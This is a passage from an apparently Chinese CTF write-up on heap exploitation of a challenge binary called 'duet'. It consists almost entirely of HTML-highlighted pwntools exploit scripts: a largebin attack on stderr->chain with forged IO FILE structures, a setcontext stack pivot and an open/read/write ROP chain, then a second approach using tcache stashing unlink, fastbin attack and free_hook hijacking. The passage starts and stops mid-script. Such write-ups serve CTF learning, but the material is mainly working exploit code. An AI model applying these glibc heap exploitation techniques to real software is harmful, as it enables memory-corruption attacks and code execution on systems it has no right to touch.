punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1e8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token operator">+</span><span class="token number">0x00007ffff7fb3090</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">-</span>heap_static<span class="token operator">+</span><span class="token number">0x000055555555c190</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token operator">+</span><span class="token number">0x7ffff7fb36e8</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># largebin attack modify stderr->chain</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000026542</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>addresspop_rdx <span class="token operator">=</span> <span class="token number">0x000000000012bda6</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>addresspop_rax <span class="token operator">=</span> <span class="token number">0x0000000000047cf8</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>addresspop_rsi <span class="token operator">=</span> <span class="token number">0x0000000000026f9e</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>addresspop_rsp <span class="token operator">=</span> <span class="token number">0x0000000000030e4e</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>addresssyscall <span class="token operator">=</span> <span class="token number">0x00000000000cf6c5</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>addressp_rbx_rbp_j_rcx_r <span class="token operator">=</span> <span class="token number">0x1456f4</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>addressflag_addr <span class="token operator">=</span> <span class="token number">0x55555555d130</span><span class="token operator">+</span>heap_base<span class="token operator">-</span>heap_staticflag_heap <span class="token operator">=</span> heap_base<span class="token operator">+</span><span class="token number">0x1000</span>rop_orw <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>flag_addr<span class="token punctuation">,</span>pop_rax<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>pop_rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># open</span>            pop_rdi<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>pop_rax<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span>flag_heap<span class="token punctuation">,</span>pop_rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># read</span>            pop_rdi<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pop_rax<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span>flag_heap<span class="token punctuation">,</span>pop_rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write</span><span class="token comment" spellcheck="true"># new_buf = malloc (new_size); // new_size = 2 * old_blen + 100</span><span class="token comment" spellcheck="true"># memcpy (new_buf, old_buf, old_blen); // old_buf = fp->_IO_buf_base, old_blen=(fp)->_IO_buf_end - (fp)->_IO_buf_base</span><span class="token comment" spellcheck="true"># free (old_buf); _IO_buf_base</span>fake_file0_buf_base <span class="token operator">=</span> <span class="token number">0x55555555ce70</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_basefake_file0_buf_end <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x300</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">0x55555555ce70</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_basefake_file0_chain <span class="token operator">=</span> <span class="token number">0x55555555ce80</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_basefake_file0 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_file0_buf_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_file0_buf_end<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write_end , buf_base, buf_end</span>fake_file0<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_file0_chain<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># chain</span>fake_file0<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb5570</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span>fake_file0<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb2780</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span>fake_file0<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7ffff7fb4620</span><span class="token operator">-</span>libc_static<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>fake_file0_old_io_buf <span class="token operator">=</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>fake_file1_buf_base <span class="token operator">=</span> <span class="token number">0x55555555cf70</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_base fake_file1_buf_end <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x300</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">0x55555555cf70</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_base <span class="token comment" spellcheck="true"># 因为我们需要算出对应的offset，满足0x300的chunk分配</span>fake_file1_chain <span class="token operator">=</span> <span class="token number">0x55555555cf80</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_base <span class="token comment" spellcheck="true"># 下一个io file的首地址</span>fake_file1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x411</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x000055555555c190</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb2890</span><span class="token operator">-</span>libc_static<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x000055555555c670</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb36c8</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># flag为0就可以绕过所有关于它的判断</span>fake_file1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_file1_buf_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_file1_buf_end<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write_end , buf_base, buf_end</span>fake_file1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_file1_chain<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># chain</span>fake_file1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb5570</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span>fake_file1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb2780</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span>fake_file1<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7ffff7fb4620</span><span class="token operator">-</span>libc_static<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># vtable</span>fake_file1_old_io_buf <span class="token operator">=</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token comment" spellcheck="true"># fake chunk，也就是io_buf_base的地址</span>fake_file2_buf_base <span class="token operator">=</span> <span class="token number">0x55555555d070</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_basefake_file2_buf_end <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x300</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">0x55555555d070</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_basefake_file2_chain <span class="token operator">=</span> <span class="token number">0x55555555cf80</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_basefake_file2 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x411</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x000055555555c190</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb2890</span><span class="token operator">-</span>libc_static<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x000055555555c670</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb36c8</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span>fake_file2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_file2_buf_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_file2_buf_end<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write_end , buf_base, buf_end</span>fake_file2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_file1_chain<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># chain</span>fake_file2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb5570</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span>fake_file2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7fb2780</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token punctuation">)</span>fake_file2<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7ffff7fb4620</span><span class="token operator">-</span>libc_static<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 0x0000000000150550: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; </span>fake_file2_old_io_buf <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x0000000000150550</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># setcontext+0x35</span>setcontext_addr <span class="token operator">=</span> <span class="token number">0x7ffff7e23e35</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_staticrop <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x55555555d080</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>setcontext_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x78</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x55555555c1c0</span><span class="token operator">-</span>heap_static<span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>payload <span class="token operator">=</span> fake_file0 <span class="token operator">+</span> fake_file0_old_io_buf <span class="token operator">+</span> fake_file1 <span class="token operator">+</span> fake_file1_old_io_buf <span class="token operator">+</span> fake_file2 <span class="token operator">+</span> fake_file2_old_io_buf <span class="token operator">+</span> rop <span class="token operator">+</span> <span class="token string">"./flag\x00\x00"</span><span class="token comment" spellcheck="true"># create 4 fake file, io_str_overflow 3 times</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1a0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token operator">+</span><span class="token number">0x00007ffff7fb3090</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">-</span>heap_static<span class="token operator">+</span><span class="token number">0x000055555555c190</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>libc_static<span class="token operator">+</span><span class="token number">0x7ffff7fb37e8</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>rop_orw<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># largebin attack modify stderr->chain</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>利用tcache stashing unlink修改global_max_fast使用fastbin attack，为造出fake chunk和fake list，令其可以分配到main_arena上。<br>free_hook-0xb68有0x100可作为suze，将top chunk改到这里，伪造一个fake top chunk size，通过几次分配劫持到free_hook，布置好rop利用rdi进行迁移栈。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>qin <span class="token operator">=</span> <span class="token number">0xb490e7</span>se <span class="token operator">=</span> <span class="token number">0x9f91e7</span>debug<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./duet"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Gong</span><span class="token punctuation">(</span>ind<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Add</span>    <span class="token keyword">assert</span> ind <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">or</span> ind <span class="token operator">==</span> <span class="token number">1</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> ind <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Instrument: "</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0xb490e7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Instrument: "</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0x9f91e7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token number">0x7f</span> <span class="token operator">&lt;</span> size <span class="token operator">&lt;=</span> <span class="token number">0x400</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Duration: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Score: "</span><span class="token punctuation">,</span> content<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Shang</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Free</span>    <span class="token keyword">assert</span> ind <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">or</span> ind <span class="token operator">==</span> <span class="token number">1</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> ind <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Instrument: "</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0xb490e7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Instrument: "</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0x9f91e7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Jue</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Show (write)</span>    <span class="token keyword">assert</span> ind <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">or</span> ind <span class="token operator">==</span> <span class="token number">1</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> ind <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Instrument: "</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0xb490e7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Instrument: "</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0x9f91e7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Zhi</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># calloc(0x88uLL, 1uLL) off-one-byte</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token number">0</span> <span class="token operator">&lt;</span> byte <span class="token operator">&lt;</span> <span class="token number">256</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span>fake_size <span class="token operator">=</span> <span class="token number">0xe0</span>broken_chunk <span class="token operator">=</span> <span class="token number">0x1f0</span>pad_chunk <span class="token operator">=</span> <span class="token number">0x240</span><span class="token comment" spellcheck="true">#gdb.attach(p,'c')</span><span class="token comment" spellcheck="true">#pause()</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>broken_chunk<span class="token punctuation">)</span>    Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>broken_chunk <span class="token operator">+</span> fake_size <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1b0</span><span class="token punctuation">)</span>    Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">)</span>    Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>    Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>    Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Gong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pad_chunk<span class="token punctuation">)</span>    Shang<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> i <span 